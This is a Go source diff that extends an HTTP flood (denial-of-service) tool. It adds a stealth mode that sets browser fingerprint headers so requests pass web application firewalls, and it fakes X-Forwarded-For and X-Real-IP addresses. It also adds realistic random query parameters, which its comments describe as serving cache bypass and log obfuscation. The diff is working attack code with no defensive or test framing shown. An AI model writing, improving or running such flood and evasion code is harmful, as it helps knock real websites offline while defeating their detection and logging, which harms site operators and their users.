@@ -9,6 +9,7 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
+	"net/url"
 	"sync/atomic"
 	"time"
 )
@@ -26,6 +27,9 @@ type HTTPFlood struct {
 	localAddr         *net.TCPAddr
 	userAgents        []string
 	referers          []string
+	enableStealth     bool
+	randomizePath     bool
+	metricsCallback   MetricsCallback
 }
 
 var defaultReferers = []string{
@@ -38,7 +42,18 @@ var defaultReferers = []string{
 	"https://www.linkedin.com/",
 }
 
-func NewHTTPFlood(timeout time.Duration, method string, postDataSize int, requestsPerConn int, bindIP string) *HTTPFlood {
+var realisticReferers = []string{
+	"google",
+	"naver",
+	"daum",
+	"facebook",
+	"direct",
+	"bing",
+	"yahoo",
+	"twitter",
+}
+
+func NewHTTPFlood(timeout time.Duration, method string, postDataSize int, requestsPerConn int, bindIP string, enableStealth bool, randomizePath bool) *HTTPFlood {
 	h := &HTTPFlood{
 		timeout:         timeout,
 		method:          method,
@@ -47,6 +62,8 @@ func NewHTTPFlood(timeout time.Duration, method string, postDataSize int, reques
 		localAddr:       newLocalTCPAddr(bindIP),
 		userAgents:      defaultUserAgents,
 		referers:        defaultReferers,
+		enableStealth:   enableStealth,
+		randomizePath:   randomizePath,
 	}
 
 	transport := &http.Transport{
@@ -112,15 +129,18 @@ func (h *HTTPFlood) sendRequest(ctx context.Context, target Target) error {
 		body = bytes.NewReader(postData)
 	}
 
-	// Add random query parameter to bypass caching
-	targetURL := fmt.Sprintf("%s?r=%d&cb=%d", target.URL, rand.Intn(100000000), rand.Intn(1000000))
+	var targetURL string
+	if h.randomizePath {
+		targetURL = h.generateRealisticURL(target.URL)
+	} else {
+		targetURL = fmt.Sprintf("%s?r=%d&cb=%d", target.URL, rand.Intn(100000000), rand.Intn(1000000))
+	}
 
 	req, err := http.NewRequestWithContext(reqCtx, h.method, targetURL, body)
 	if err != nil {
 		return fmt.Errorf("failed to create request: %w", err)
 	}
 
-	// Set random headers to appear as different clients
 	req.Header.Set("User-Agent", h.userAgents[rand.Intn(len(h.userAgents))])
 	req.Header.Set("Referer", h.referers[rand.Intn(len(h.referers))])
 	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
@@ -130,27 +150,132 @@ func (h *HTTPFlood) sendRequest(ctx context.Context, target Target) error {
 	req.Header.Set("Pragma", "no-cache")
 	req.Header.Set("Connection", "keep-alive")
 
+	if h.enableStealth {
+		h.applyStealthHeaders(req)
+	}
+
 	if h.method == "POST" {
 		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	}
 
-	// Add custom headers from target
 	for k, v := range target.Headers {
 		req.Header.Set(k, v)
 	}
 
+	startTime := time.Now()
 	resp, err := h.client.Do(req)
+	latency := time.Since(startTime)
+
 	if err != nil {
 		return fmt.Errorf("request failed: %w", err)
 	}
 	defer resp.Body.Close()
 
-	// Discard response body quickly
 	io.Copy(io.Discard, resp.Body)
 
 	atomic.AddInt64(&h.requestsSent, 1)
 
+	if h.metricsCallback != nil {
+		h.metricsCallback.RecordSuccessWithLatency(latency)
+	}
+
 	return nil
+}
+
+// applyStealthHeaders adds modern browser fingerprint headers to bypass WAF detection.
+// These headers (Sec-Fetch-*) are sent by Chrome/Edge browsers to identify legitimate requests.
+func (h *HTTPFlood) applyStealthHeaders(req *http.Request) {
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	req.Header.Set("Sec-Fetch-Dest", "document")
+	req.Header.Set("Sec-Fetch-Mode", "navigate")
+	req.Header.Set("Sec-Fetch-Site", h.randomSecFetchSite())
+	req.Header.Set("Sec-Fetch-User", "?1")
+	req.Header.Set("Sec-CH-UA", `"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"`)
+	req.Header.Set("Sec-CH-UA-Mobile", "?0")
+	req.Header.Set("Sec-CH-UA-Platform", h.randomPlatform())
+
+	if rand.Float32() < 0.5 {
+		fakeIP := fmt.Sprintf("%d.%d.%d.%d",
+			rand.Intn(223)+1, rand.Intn(256), rand.Intn(256), rand.Intn(254)+1)
+		req.Header.Set("X-Forwarded-For", fakeIP)
+	}
+
+	if rand.Float32() < 0.3 {
+		req.Header.Set("X-Real-IP", fmt.Sprintf("%d.%d.%d.%d",
+			rand.Intn(223)+1, rand.Intn(256), rand.Intn(256), rand.Intn(254)+1))
+	}
+}
+
+func (h *HTTPFlood) randomSecFetchSite() string {
+	sites := []string{"none", "same-origin", "same-site", "cross-site"}
+	weights := []int{40, 30, 20, 10}
+	total := 0
+	for _, w := range weights {
+		total += w
+	}
+	r := rand.Intn(total)
+	cumulative := 0
+	for i, w := range weights {
+		cumulative += w
+		if r < cumulative {
+			return sites[i]
+		}
+	}
+	return "none"
+}
+
+func (h *HTTPFlood) randomPlatform() string {
+	platforms := []string{`"Windows"`, `"macOS"`, `"Linux"`}
+	return platforms[rand.Intn(len(platforms))]
+}
+
+// generateRealisticURL creates a URL with realistic query parameters
+// that mimic organic user traffic patterns for cache bypass and log obfuscation.
+func (h *HTTPFlood) generateRealisticURL(baseURL string) string {
+	u, err := url.Parse(baseURL)
+	if err != nil {
+		return fmt.Sprintf("%s?r=%d", baseURL, rand.Intn(100000000))
+	}
+
+	q := u.Query()
+
+	q.Set("_", fmt.Sprintf("%d", time.Now().UnixMilli()))
+
+	q.Set("r", fmt.Sprintf("%.8f", rand.Float64()))
+
+	q.Set("ref", realisticReferers[rand.Intn(len(realisticReferers))])
+
+	q.Set("v", fmt.Sprintf("%d", rand.Intn(100)+1))
+
+	if rand.Float32() < 0.2 {
+		q.Set("uid", fmt.Sprintf("%d", rand.Intn(90000)+10000))
+	}
+
+	if rand.Float32() < 0.15 {
+		q.Set("session", h.generateSessionID())
+	}
+
+	if rand.Float32() < 0.25 {
+		devices := []string{"desktop", "mobile", "tablet"}
+		q.Set("device", devices[rand.Intn(len(devices))])
+	}
+
+	if rand.Float32() < 0.1 {
+		utmSources := []string{"google", "facebook", "newsletter", "direct", "twitter"}
+		q.Set("utm_source", utmSources[rand.Intn(len(utmSources))])
+	}
+
+	u.RawQuery = q.Encode()
+	return u.String()
+}
+
+func (h *HTTPFlood) generateSessionID() string {
+	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
+	result := make([]byte, 16)
+	for i := range result {
+		result[i] = chars[rand.Intn(len(chars))]
+	}
+	return string(result)
 }
 
 func (h *HTTPFlood) generatePostData() []byte {
@@ -177,4 +302,8 @@ func (h *HTTPFlood) ActiveConnections() int64 {
 
 func (h *HTTPFlood) RequestsSent() int64 {
 	return atomic.LoadInt64(&h.requestsSent)
+}
+
+func (h *HTTPFlood) SetMetricsCallback(callback MetricsCallback) {
+	h.metricsCallback = callback
 }
